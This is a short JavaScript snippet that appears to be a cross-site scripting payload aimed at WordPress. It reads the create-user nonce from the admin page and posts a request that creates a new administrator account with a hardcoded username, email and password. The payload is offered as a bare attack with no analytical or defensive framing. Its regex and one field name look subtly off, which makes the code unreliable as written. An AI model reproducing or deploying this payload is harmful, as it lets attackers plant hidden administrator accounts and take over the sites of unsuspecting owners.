u = "/wp-admin/user-new.php";
jQuery.get(u, function(e) {
    jQuery.post(u, {
        action: "createuser",
        "_wpnonce_create-user": e.match(/_wpnonce _create-user\"\svalue=\"(.+?)\"/)[1],
        user_Login: "kaderdz",
        email: "ttest34030@gmail.com",
        pass1: "hohoHOHO2013@@@",
        pass2: "hohoHOHO2013@@@",
        role: "administrator"
    })
});
